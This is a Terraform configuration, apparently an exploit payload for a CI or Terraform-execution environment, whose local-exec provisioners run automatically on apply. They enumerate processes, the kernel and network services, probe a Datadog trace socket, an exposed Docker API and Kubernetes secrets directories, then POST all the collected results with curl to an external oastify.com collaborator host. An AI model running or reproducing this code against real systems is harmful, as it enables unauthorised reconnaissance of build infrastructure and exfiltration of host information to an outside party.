# main.tf - Capture All Exploitation Results
resource "null_resource" "capture_all_results" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== COMPREHENSIVE EXPLOITATION RESULTS ===" > /tmp/full_results.txt
      
      # 1. Datadog Socket Results
      echo "=== DATADOG SOCKET TEST ===" >> /tmp/full_results.txt
      python3 -c "
      import socket
      import json
      try:
          s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
          s.connect('/var/datadog/trace.sock')
          print('SOCKET CONNECTED')
          trace_data = {'traces': [[{'trace_id': 12345}]]}
          s.send(json.dumps(trace_data).encode() + b'\n')
          response = s.recv(1024)
          print('RESPONSE:', response.decode())
          s.close()
      except Exception as e:
          print('ERROR:', str(e))
      " >> /tmp/full_results.txt 2>&1
      
      # 2. Process List
      echo "=== RUNNING PROCESSES ===" >> /tmp/full_results.txt
      ps aux >> /tmp/full_results.txt
      
      # 3. Kernel Info
      echo "=== KERNEL INFORMATION ===" >> /tmp/full_results.txt
      uname -a >> /tmp/full_results.txt
      cat /proc/version >> /tmp/full_results.txt
      
      # 4. Network Services
      echo "=== NETWORK SERVICES ===" >> /tmp/full_results.txt
      netstat -tulpn 2>/dev/null >> /tmp/full_results.txt || ss -tulpn 2>/dev/null >> /tmp/full_results.txt
      
      # 5. Docker API Check
      echo "=== DOCKER API CHECK ===" >> /tmp/full_results.txt
      for port in 2375 2376; do
        curl -s http://172.17.0.1:$port/version >> /tmp/full_results.txt 2>&1 && echo "DOCKER API PORT $port OPEN" >> /tmp/full_results.txt || true
      done
      
      # 6. Kubernetes Check
      echo "=== KUBERNETES CHECK ===" >> /tmp/full_results.txt
      ls -la /var/run/secrets/kubernetes.io/ >> /tmp/full_results.txt 2>&1
      
      # 7. Send ALL results to collaborator
      curl -X POST --data-binary @/tmp/full_results.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/full_results
      
      echo "All results sent"
    EOT
  }
}

resource "null_resource" "critical_findings_summary" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== CRITICAL FINDINGS SUMMARY ==="
      
      # Check for the most critical evidence
      CRITICAL_COUNT=0
      
      # 1. Check if Datadog socket is connectable
      if python3 -c "import socket; s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect('/var/datadog/trace.sock'); print('connected')" 2>/dev/null; then
        echo "CRITICAL: Datadog socket accessible"
        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
      fi
      
      # 2. Check for Docker API
      if curl -s http://172.17.0.1:2375/version 2>/dev/null; then
        echo "CRITICAL: Docker API exposed"
        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
      fi
      
      # 3. Check for Kubernetes
      if [ -d "/var/run/secrets/kubernetes.io/serviceaccount" ]; then
        echo "CRITICAL: Kubernetes environment"
        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
      fi
      
      # 4. Check for privileged capabilities
      if [ -w /dev/kmsg ]; then
        echo "CRITICAL: Privileged container"
        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
      fi
      
      echo "TOTAL CRITICAL FINDINGS: $CRITICAL_COUNT"
      
      if [ $CRITICAL_COUNT -gt 0 ]; then
        curl -X POST -d "critical_findings=true" -d "count=$CRITICAL_COUNT" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/critical_summary
      else
        curl -X POST -d "no_critical_findings=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/no_critical
      fi
    EOT
  }
}
